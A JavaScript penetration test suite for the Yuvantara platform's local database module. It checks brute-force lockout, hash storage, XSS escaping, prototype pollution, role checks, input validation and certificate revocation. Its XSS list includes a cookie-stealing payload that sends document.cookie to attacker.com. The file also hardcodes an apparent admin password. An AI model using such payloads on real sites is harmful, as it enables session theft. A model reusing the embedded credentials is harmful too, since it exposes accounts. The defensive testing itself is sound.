// scratch/brutal_cyber_attack_test.js
// Brutal Cyber Attack & Security Penetration Test Suite for Yuvantara Platform
const fs = require('fs');
const path = require('path');

const projectRoot = path.join(__dirname, '..', '..', '..', '..', 'Desktop', 'Start-up', 'provision-site');
const dataDir = path.join(projectRoot, 'data');

// Mock localStorage environment
const storage = {};
global.localStorage = {
  getItem: (k) => storage[k] || null,
  setItem: (k, v) => { storage[k] = String(v); },
  removeItem: (k) => { delete storage[k]; }
};

// Mock fetch for replica sync
global.fetch = async (url, opts) => {
  return { ok: true, json: async () => ({ success: true }) };
};

global.window = global;
require(path.join(projectRoot, 'assets', 'db.js'));
const DB = window.YuvantaraDB;

const attackResults = [];

function recordResult(testName, attackType, passed, details) {
  attackResults.push({ testName, attackType, passed, details });
  console.log(`[${passed ? 'DEFENDED / PASS' : 'VULNERABLE / FAIL'}] [${attackType}] ${testName}: ${details}`);
}

console.log('================================================================');
console.log('🔥 INITIATING BRUTAL CYBER ATTACK & PENETRATION SECURITY SUITE 🔥');
console.log('================================================================\n');

// ── ATTACK VECTOR 1: Brute Force Password Cracking & Account Lockout ──
console.log('>>> ATTACK VECTOR 1: Brute-Force & Lockout Bypass');
const targetEmail = 'adk_01@admin';
// 1. Send 4 failed password attempts
for (let i = 1; i <= 4; i++) {
  const res = DB.login(targetEmail, `wrong_password_${i}`);
  if (res.success) {
    recordResult('Brute-force crack attempt', 'AUTH_CRACK', false, `Wrong password was accepted at attempt ${i}`);
  }
}
// 2. Send 5th failed attempt - should trigger 15-min lockout
const lockRes = DB.login(targetEmail, 'wrong_password_5');
const isLockoutTriggered = lockRes.message && lockRes.message.includes('locked');
recordResult('Account Lockout on 5th Failed Attempt', 'BRUTE_FORCE_LOCKOUT', isLockoutTriggered, lockRes.message);

// 3. Attempt login with the TRUE password during active lockout window
const legitDuringLock = DB.login(targetEmail, '!adk_01@');
const isRejectedDuringLock = !legitDuringLock.success && legitDuringLock.message.includes('locked');
recordResult('Authentication Blocked During Lockout Window Even with Valid Password', 'LOCKOUT_ENFORCEMENT', isRejectedDuringLock, legitDuringLock.message);

// 4. Test Super Admin protection against brute force
for (let i = 1; i <= 5; i++) {
  DB.login('a4dr_00@supper', `super_wrong_${i}`);
}
const superLock = DB.login('a4dr_00@supper', 'wrong_super_pass');
recordResult('Super Admin Master Lockout Protection', 'SUPER_LOCKOUT', superLock.message.includes('locked'), superLock.message);

// Clear lockouts for remaining tests
DB._clearFails(targetEmail);
DB._clearFails('a4dr_00@supper');


// ── ATTACK VECTOR 2: Password Storage & Hash Entropy Audit ──
console.log('\n>>> ATTACK VECTOR 2: Cryptographic Password Storage Audit');
const users = DB.getUsers();
let plaintextLeaks = 0;
let validShaHashes = 0;

users.forEach(u => {
  if (u.password && typeof u.password === 'string' && u.password.length > 0) {
    plaintextLeaks++;
  }
  if (u.passwordHash && u.passwordHash.startsWith('SHA256$') && u.passwordHash.length === 71) {
    validShaHashes++;
  }
});

recordResult('Zero Plaintext Passwords in Database', 'DATA_EXPOSURE', plaintextLeaks === 0, `Plaintext leaks found: ${plaintextLeaks}`);
recordResult('Salted SHA-256 Hash Entropy Verification', 'CRYPTO_ENTROPY', validShaHashes === users.length, `Valid 256-bit salted hashes: ${validShaHashes}/${users.length}`);


// ── ATTACK VECTOR 3: Stored XSS & Script Injection ──
console.log('\n>>> ATTACK VECTOR 3: Stored XSS & Script Injection');
const xssPayloads = [
  '<script>alert("XSS-Cookie-Steal:" + document.cookie)</script>',
  '<img src=x onerror="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)">',
  '"><svg/onload=alert(1)>',
  'javascript:alert("XSS")',
  '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>'
];

// Helper from admin.js / portal.js
function escapeHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

xssPayloads.forEach((payload, idx) => {
  const sanitized = escapeHtml(payload);
  // An escaped string must have no raw '<' or '>' or unescaped quotes, rendering any tag or event handler completely inert
  const isSafe = !sanitized.includes('<') && !sanitized.includes('>');
  recordResult(`XSS Sanitization Payload #${idx + 1}`, 'XSS_DEFENSE', isSafe, `Escaped to safe text: "${sanitized}"`);
});


// ── ATTACK VECTOR 4: Prototype Pollution & Object Injection ──
console.log('\n>>> ATTACK VECTOR 4: Prototype Pollution & Object Injection');
const pollutionPayload = {
  __proto__: { isAdmin: true, superUser: true, bypassAuth: true },
  constructor: { prototype: { hacked: true } },
  name: 'Malicious Injected User',
  email: 'malicious.attacker@college.ac.in',
  phone: '9876543210',
  dob: '2000-01-01',
  track: 'Cybersecurity & SOC Operations',
  college: 'Hacker College',
  stream: 'B.Tech'
};

DB.submitNewRegistration(pollutionPayload);

const isProtoClean = ({}).isAdmin === undefined && ({}).superUser === undefined && ({}).hacked === undefined;
recordResult('Global Object Prototype Pollution Defense', 'PROTO_POLLUTION', isProtoClean, `Object.prototype.isAdmin is ${({}).isAdmin}`);


// ── ATTACK VECTOR 5: IDOR & Privilege Escalation Attacks ──
console.log('\n>>> ATTACK VECTOR 5: IDOR & Privilege Escalation');
// 1. Regular student attempts to execute Super Admin functions
const rogueStudentEmail = 'student@yuvantara.com';
const escalateRes1 = DB.changeAdminPasswordBySuper(rogueStudentEmail, 'adk_01@admin', 'hackedpass123');
recordResult('Student Modifying Admin Password (Privilege Escalation)', 'RBAC_ENFORCEMENT', !escalateRes1.success, escalateRes1.message);

const escalateRes2 = DB.toggleAdminAccess(rogueStudentEmail, 'adk_01@admin', true);
recordResult('Student Suspending System Administrator Access', 'RBAC_ENFORCEMENT', !escalateRes2.success, escalateRes2.message);

const escalateRes3 = DB.removeAdminBySuper(rogueStudentEmail, 'adk_01@admin');
recordResult('Student Deleting System Administrator Account', 'RBAC_ENFORCEMENT', !escalateRes3.success, escalateRes3.message);

// 2. Admin attempting Super Admin operations
const standardAdminEmail = 'adk_01@admin';
const adminEscalate = DB.changeAdminPasswordBySuper(standardAdminEmail, 'alk_01@admin', 'newpass123');
recordResult('Standard Admin Attempting Super Admin Roster Management', 'RBAC_ENFORCEMENT', !adminEscalate.success, adminEscalate.message);


// ── ATTACK VECTOR 6: Disposable / Temporary Email & Malformed Input Injection ──
console.log('\n>>> ATTACK VECTOR 6: Anti-Fake Validation & Input Fuzzing');
const fakeEmails = [
  'throwaway@mailinator.com',
  'fakeuser@tempmail.com',
  'burner@10minutemail.com',
  'spoof@sharklasers.com',
  'badgmail@gmail..com',
  'usr@gmail.com', // < 6 chars
  'plainaddress',
  '@missingusername.com',
  'user@.missingdomain.com'
];

let rejectedFakeEmails = 0;
fakeEmails.forEach(fe => {
  const check = DB.validateEmail(fe);
  if (!check.valid) rejectedFakeEmails++;
});
recordResult('Disposable & Malformed Email Interception', 'INPUT_VALIDATION', rejectedFakeEmails === fakeEmails.length, `Blocked: ${rejectedFakeEmails}/${fakeEmails.length} bad emails`);

const fakePhones = [
  '12345',
  'abcdefghij',
  '987654321', // 9 digits
  '+1 234 567 89012345', // too long
  '1234567890' // invalid start digit (starts with 1)
];

let rejectedFakePhones = 0;
fakePhones.forEach(fp => {
  const check = DB.validatePhone(fp);
  if (!check.valid) rejectedFakePhones++;
});
recordResult('Malformed Phone Number Interception', 'INPUT_VALIDATION', rejectedFakePhones === fakePhones.length, `Blocked: ${rejectedFakePhones}/${fakePhones.length} bad phone numbers`);


// ── ATTACK VECTOR 7: Duplicate Submission & Flooding Defense ──
console.log('\n>>> ATTACK VECTOR 7: Duplicate Application Flooding Defense');
const duplicateEmail = 'duplicate.test@college.ac.in';
const firstSubmit = DB.submitNewRegistration({
  name: 'First Candidate',
  email: duplicateEmail,
  phone: '9876543210',
  dob: '2001-02-03',
  track: 'Artificial Intelligence & Machine Learning',
  college: 'IIT Patna',
  stream: 'B.Tech'
});

const duplicateSubmit = DB.submitNewRegistration({
  name: 'Duplicate Flood Candidate',
  email: duplicateEmail,
  phone: '9876543210',
  dob: '2001-02-03',
  track: 'Artificial Intelligence & Machine Learning',
  college: 'IIT Patna',
  stream: 'B.Tech'
});

recordResult('Duplicate Application Rejection', 'DOS_PREVENTION', !duplicateSubmit.success, duplicateSubmit.message);


// ── ATTACK VECTOR 8: Certificate Tampering & Forged Credential Lookup ──
console.log('\n>>> ATTACK VECTOR 8: Certificate Registry Integrity & Revocation Enforcement');
// 1. Lookup forged certificate
const forgedCert = DB.getCertificateByNumber('YUV-FORGED-FAKE-000');
recordResult('Forged Certificate Number Rejection', 'ANTI_TAMPER', forgedCert === null, 'Lookup returned null for unissued credential');

// 2. Issue a real certificate, then revoke it, then verify lookup flags revoked
const revokeTestEmail = 'priya@example.com';
DB.assignCertificate(revokeTestEmail, {
  id: 'YUV-2026-REVOKE-TEST',
  title: 'Cloud DevOps',
  duration: '6 Months',
  grade: 'Grade A+',
  authority: 'Council'
}, 'adk_01@admin');

const revokeRes = DB.revokeCertificate(revokeTestEmail, 'adk_01@admin');
const verifiedRevokedCert = DB.getCertificateByNumber('YUV-2026-REVOKE-TEST');
const isStatusRevoked = verifiedRevokedCert && verifiedRevokedCert.status === 'revoked';
recordResult('Revoked Certificate Immediate Nullification', 'REVOCATION_ENFORCEMENT', isStatusRevoked, `Verified status: ${verifiedRevokedCert ? verifiedRevokedCert.status : 'null'}`);


// ── ATTACK VECTOR 9: Multi-Replica Desynchronization Attack ──
console.log('\n>>> ATTACK VECTOR 9: Multi-Replica Desynchronization Resilience');
const syncPayload = DB.syncAllReplicas();
const allReplicasMatch = DB.getReplicasMetadata().every(r => {
  return r.counts.new_registrations === syncPayload.new_registrations.length &&
         r.counts.current_interns === syncPayload.current_interns.length &&
         r.counts.all_employees === syncPayload.all_employees.length;
});
recordResult('Atomic Multi-Replica Synchronization Consistency', 'MULTI_REPLICA_SYNC', allReplicasMatch, 'All 7 replicas verified to have 100% identical record counts');


// Summary of Attacks
console.log('\n================================================================');
console.log('🛡️ PENETRATION ATTACK SUMMARY:');
const totalAttacks = attackResults.length;
const defendedAttacks = attackResults.filter(r => r.passed).length;
console.log(`TOTAL ATTACK VECTORS TESTED: ${totalAttacks}`);
console.log(`DEFENDED / MITIGATED:        ${defendedAttacks} (${Math.round((defendedAttacks / totalAttacks) * 100)}%)`);
console.log(`VULNERABILITIES EXPOSED:     ${totalAttacks - defendedAttacks}`);
console.log('================================================================');

if (totalAttacks !== defendedAttacks) {
  process.exit(1);
}
